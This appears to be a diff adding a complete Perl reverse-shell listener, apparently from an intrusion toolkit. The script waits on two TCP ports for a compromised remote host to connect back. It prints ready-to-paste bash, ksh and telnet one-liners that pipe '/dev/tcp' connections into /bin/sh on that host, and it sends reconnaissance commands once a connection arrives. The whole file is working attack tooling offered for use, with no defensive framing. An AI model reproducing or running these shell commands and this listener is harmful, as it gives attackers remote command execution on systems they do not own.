@@ -1,0 +1,230 @@
+#!/usr/bin/env perl
+#use strict;
+#TODO: $quiet aint working for some reason
+#TODO: Test that other guy's box isn't hosed...
+use IO::Socket ;
+
+my ($usagetext, $prog, $port, $port2, $kidpid, $server, $server2,
+    $client, $other_end, $other_iaddr, $other_ip, $other_port, $version,
+    $defaultcommands, $tmp);
+$version = "1.4";
+$| = 1; # unbuffered output
+myinit() ;
+
+if ($destIP) {
+  print "Choose ONE remote command to connect to $prog:
+
+$samples
+
+NOTE: The \"2>\&1\" syntax is not recognized by csh on the other host. It
+      gives the error 'ambiguous redirect'. If you see that, change to sh
+      or bash before you run this on the other host (or use csh if you must
+      but omit the three occurrences of 2>\&1 and any stderr from commands
+      will not be seen in the doublet window).
+
+" ;
+}
+# split into two processes
+print STDERR "When connection established, will send up these commands:\n$defaultcommands\n\n" unless $quiet;
+progprint("Confirmed this window is scripted ($scriptordie)");
+
+die "cannot fork: $! " unless (defined ($kidpid = fork())) ;
+
+if (! $kidpid) { # child
+  close (STDIN) ; # trying to fix
+  my ($line) ; # trying to fix
+  $server = IO::Socket::INET->new(LocalPort  => $port2,
+				  Type       => SOCK_STREAM,
+				  Reuse      => 1,
+				  Listen     => 1 )
+    or die "Cannot be a tcp server on port $port2 : $@\n";
+  progprint("Waiting on $port2 for output",$COLOR_FAILURE,$COLOR_NOTE);
+
+
+  $client = $server->accept() ;
+  $other_end = getpeername($client)
+    or die "Could not identify other end: $!\n";
+  ($other_port, $other_iaddr) = unpack_sockaddr_in($other_end);
+  $other_ip = inet_ntoa($other_iaddr) ;
+  progprint("connect on $port2 for output from $other_ip:$other_port",$COLOR_FAILURE);
+  # parent accepts output from other end
+  while (defined ($line = <$client>) ) {
+    print STDOUT "$line" ;
+  }
+} else { # parent
+  my ($line) ; # trying to fix
+  close (STDOUT) ; # trying to fix
+  $server2 = IO::Socket::INET->new(LocalPort  => $port1,
+				   Type       => SOCK_STREAM,
+				   Reuse      => 1,
+				   Listen     => 1 )
+    or die "Cannot be a tcp server on port $port1 : $@\n";
+  progprint("Waiting on $port1 for input",$COLOR_FAILURE,$COLOR_NOTE);
+
+  $client = $server2->accept() ;
+  $other_end = getpeername($client)
+    or die "Could not identify other end: $!\n";
+  ($other_port, $other_iaddr) = unpack_sockaddr_in($other_end);
+  $other_ip = inet_ntoa($other_iaddr) ;
+  progprint("connect on $port1 for  input from $other_ip:$other_port",$COLOR_FAILURE);
+  print $client "$defaultcommands\n" unless $quiet;
+
+  # child sends stdin through to other end
+  while (defined ($line = <STDIN>) ) {
+    print $client "$line" ;
+  }
+  kill ( "TERM" => $kidpid); # send SIGTERM to child
+} # end if kid or not
+exit;
+
+sub usage {
+  @_ = () if ( $_[0] eq "-h") ;
+  print $usagetext unless (@_ or $opt_v) ;
+  print $vertext unless (@_) ;
+  progprint("\nFATAL ERROR: @_\n",$COLOR_FAILURE) if ( @_ and !$opt_h );
+  exit;
+} # end sub usage
+
+sub ipcheck() {
+  # returns 1 iff $ipstr is in dotted decimal notation with each 
+  # octet between 0 and 255 inclusive (i.e. 0.0.0.0 and 255.255.255.255 are valid)
+  local($ipstr,@junk) = @_;
+  # need -1 in following split to keep null trailing fields (to reject "1.2.3.4.")
+  @octets=split(/\./,$ipstr,-1);
+  return 0 if ($#octets != 3);
+  foreach (@octets) {
+    # return 0 if (empty or nondigits or <0 or >255)
+    return 0 if ($_ eq "" || ( /\D/ ) || $_ < 0 || $_ > 255);
+  }
+  return 1;
+} # end sub ipcheck
+
+sub myinit {
+  use File::Basename;
+  require "getopts.pl";
+  $COLOR_SUCCESS="\033[1;32m";
+  $COLOR_FAILURE="\033[1;31m";
+  $COLOR_WARNING="\033[1;33m";
+  $COLOR_NORMAL="\033[0;39m";
+  $COLOR_NOTE="\033[0;34m";
+
+  $prog = basename ${0} ;
+  $vertext = "$prog version $version\n" ;
+  $defaultcommands = "cd /tmp ; uname -a ; date ; date -u \
+w ; pwd ; ls -alrt ; pwd" ;
+  usage("bad option(s)") if (! &Getopts( "qvhi:" ) ) ;
+  $quiet = $opt_q ;
+  $destIP = $opt_i ;
+  unless ($destIP) {
+    my @interface = (ppp0,eth0,eth1) ;
+    foreach (@interface) {
+      last if ($destIP) = 
+	(`ifconfig $_ 2>/dev/null | grep inet` =~ /inet addr:([0-9.]+) /) ;
+    }
+  }
+  $samples = "${COLOR_NOTE}
+SOLARIS WITH ksh IN PATH (or tack a /bin/ in front of this):$COLOR_NORMAL
+
+ ksh -c \"cat < /dev/tcp/destIP/port1 | /bin/sh 2>\&1 | cat > /dev/tcp/destIP/port2 2>\&1\"
+
+${COLOR_NOTE}
+LINUX WITH bash IN PATH or IN bash (or tack a /bin/ in front of this):$COLOR_NORMAL
+
+ bash -c \"cat < /dev/tcp/destIP/port1 | /bin/sh 2>\&1 | cat > /dev/tcp/destIP/port2 2>\&1\"
+
+${COLOR_NOTE}
+ABOVE BUT ALREADY IN THE PROPER SHELL:$COLOR_NORMAL
+
+ cat < /dev/tcp/destIP/port1 | /bin/sh 2>\&1 | cat > /dev/tcp/destIP/port2 2>\&1
+
+${COLOR_NOTE}
+IF NO JOY ABOVE:$COLOR_NORMAL
+
+ (telnet destIP port1 2>\&1 ; sleep 1) | /bin/sh 2>\&1 | telnet destIP port2 2>\&1
+
+${COLOR_NOTE}
+IF NO JOY ABOVE AND ONLY HAVE csh (or see error \"Ambiguous output redirect\"):$COLOR_NORMAL
+
+ (telnet destIP port1 ; sleep 1) | /bin/sh | telnet destIP port2
+
+";
+  ($port1,$port2) = @ARGV ;
+  $port1 = int($port1) ;
+  $port2 = int($port2) ;
+  $port2 = $port1 + 1 unless ($port2 or !$port1);
+  $samples =~ s/destIP/$destIP/g if $destIP ;
+  $samples =~ s/port1/$port1/g if $port1 ;
+  $samples =~ s/port2/$port2/g if $port2 ;
+
+  $usagetext = "
+Usage: $prog [-i destIP] [-q] port1 [port2]
+
+$prog waits for two tcp connections on port1 and port2 from a remote
+host. One is used to send commands to the remote system, and the other
+is used to bring output from those commands back. Note, however, that
+both tcp tcpconnections are originated from the remote side (and so you
+must somehow be able to get that command executed on the remote side).
+
+NOTE: The \"2>\&1\" syntax is not recognized by csh on the other host. It
+      gives the error 'ambiguous redirect'. If you see that, change to sh
+      or bash before you run this on the other host (or use csh if you
+      must but omit the three occurrences of 2>\&1 and any stderr from
+      commands will not be seen in the doublet window).
+
+Use $prog with something like one of the following commands on your remote
+host (ONLY ONE):
+$samples
+If port2 is omitted, port1+1 is used.
+
+The commands shown above are given as pastables with the actual ports and
+IP (a local IP is shown if -i is not provided).
+
+Unless the -q (quiet) parameter is used, $prog sends up these commands once a
+connection is first received:
+
+";
+  foreach (split (/\n/, $defaultcommands) ) {
+    $usagetext .= "\t$_\n";
+  }
+  $usagetext .= "\n";
+  usage() if ($opt_h or $opt_v) ;
+  usage("Bad IP $opt_i") if ($opt_i and (! &ipcheck($opt_i))) ;
+  $defaultcommands = "" if ($quiet) ;
+  usage("-h") unless (@ARGV == 1 or @ARGV == 2) ;
+
+  usage("Invalid port $ARGV[0]") unless ($port1 eq $ARGV[0]) ;
+  usage("Invalid port $port1") if ($port1 < 1 or $port1 > 65534) ;
+  usage("Invalid port $port2") if ($port2 < 1 or $port2 > 65534) ;
+
+  my $ppid = getppid();
+  my $pprocess = `ps -ef | grep $ppid | egrep -v "perl|grep"` ;
+  my ($pppid) = $pprocess =~ /\w+\s+\w+\s+(\w+)/ ;
+  $scriptordie =  `ps -ef | grep $pppid | egrep -v "perl|grep" | grep script.*/down` ;
+  unless ($scriptordie) {
+    my $processes = `ps -ef | egrep "$$|$pppid" | egrep -v "grep"` ;
+    usage("\aYou must run $prog in a scripted window.\n\nI.e., grandparent process myst match \"script.*/down\" and does not:$COLOR_NOTE\n$processes\n");
+
+  } else {
+    $scriptordie =~ s/.*script/script/ ;
+    chomp($scriptordie);
+  }
+  #  OK. Good to go from here.
+}#myinit
+sub progprint {
+  local ($what,$color,$color2,$what2) = (@_) ;
+  local $newlines ;
+  $color = $COLOR_NOTE unless $color ;
+  $color2 = $color unless $color2 ;
+  $what2 = " $what2" if ($what2) ;
+  while (substr($what,0,1) eq "\n") {
+    $newlines .= "\n";
+    $what = substr($what,1) ;
+  }
+  if ($color eq $COLOR_FAILURE) {
+    $newlines .= "\a" ;
+    select STDERR ;
+  }
+  $| = 1;
+  print "$newlines${color2}$prog\[$$]$what2: ${color}$what$COLOR_NORMAL\n" ;
+  select STDOUT ;
+}
